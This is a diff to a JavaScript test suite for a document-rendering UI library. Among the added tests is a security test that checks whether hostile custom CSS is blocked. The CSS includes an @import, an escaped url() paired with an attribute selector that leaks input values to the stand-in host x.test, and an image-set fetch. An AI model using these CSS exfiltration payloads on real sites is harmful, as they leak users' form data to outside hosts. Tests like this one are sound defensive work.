@@ -6,8 +6,8 @@ import http from 'node:http';
 import { mkdtemp } from 'node:fs/promises';
 import os from 'node:os';
 import path from 'node:path';
-import { DocumentStore } from 'intelligence-ui/node';
-import { createDocument, mountDocument, renderDocument } from 'intelligence-ui';
+import { DocumentStore } from '@haowei2000/intelligence-ui/node';
+import { createDocument, mountDocument, renderDocument } from '@haowei2000/intelligence-ui';
 
 function setup(options = {}) {
   const dom = new JSDOM('<div id="app"></div>');
@@ -170,4 +170,43 @@ test('embedded fields write through a caller HTTP API to disk and hydrate after 
     assert.equal(second.root.querySelector('[data-field="name"]').value, '写回数据库接口');
     second.controller.destroy(); second.dom.window.close();
   } finally { first.controller.destroy(); first.dom.window.close(); await new Promise(resolve => server.close(resolve)); }
+});
+
+test('custom CSS that references external resources is not applied', () => {
+  const errors = [];
+  for (const css of ['@import url(https://x.test/a.css)', 'input[value^=a]{background:u\\72l(https://x.test/?a)}', 'b{background:image-set("https://x.test/i.png" 1x)}']) {
+    const document = createDocument({ title: 'CSS', css });
+    const { dom, controller, root } = setup({ document, onError: error => errors.push(error) });
+    assert.doesNotMatch(root.querySelector('style').textContent, /x\.test/);
+    controller.destroy(); dom.window.close();
+  }
+  assert.equal(errors.length, 3);
+});
+
+test('createDocument works without crypto.randomUUID (insecure contexts)', () => {
+  const original = globalThis.crypto.randomUUID;
+  Object.defineProperty(globalThis.crypto, 'randomUUID', { value: undefined, configurable: true });
+  try { assert.match(createDocument().manifest.id, /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/); }
+  finally { Object.defineProperty(globalThis.crypto, 'randomUUID', { value: original, configurable: true, writable: true }); }
+});
+
+test('clearing notes in a document without decisions keeps the textarea', () => {
+  const document = createDocument({ title: '备注', state: { selections: {}, notes: 'x' } });
+  const { dom, controller, root } = setup({ document });
+  const notes = root.querySelector('[data-notes]');
+  edit(dom, notes, '');
+  controller.update(controller.getDocument());
+  assert.equal(root.querySelector('[data-notes]'), notes);
+  controller.destroy(); dom.window.close();
+});
+
+test('edits made before onSave is supplied are saved once it arrives', async () => {
+  const writes = [];
+  const { dom, controller, root } = setup();
+  edit(dom, root.querySelector('[data-notes]'), '早期');
+  controller.update(undefined, { onSave: async doc => { writes.push(doc); } });
+  await controller.flush();
+  assert.equal(writes.length, 1);
+  assert.equal(writes[0].state.notes, '早期');
+  controller.destroy(); dom.window.close();
 });
